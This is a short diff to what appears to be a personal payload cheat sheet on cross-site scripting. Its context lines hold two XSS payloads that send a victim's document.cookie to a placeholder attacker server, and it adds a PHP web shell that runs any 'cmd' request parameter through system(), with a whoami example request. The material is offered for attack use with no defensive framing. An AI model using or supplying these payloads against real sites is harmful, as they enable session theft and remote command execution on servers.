@@ -18,6 +18,14 @@ The data is included in dynamic content that is sent to a web user without being
 	<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
 	<img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
 
+## php payloads
+
+	if isset($_REQUEST['cmd']){
+		system($_REQUEST['cmd']);
+	}
+	then we pass the cmd arg in the request:
+	<url>?cmd=whoami
+
 
 ## Relevant Information
 
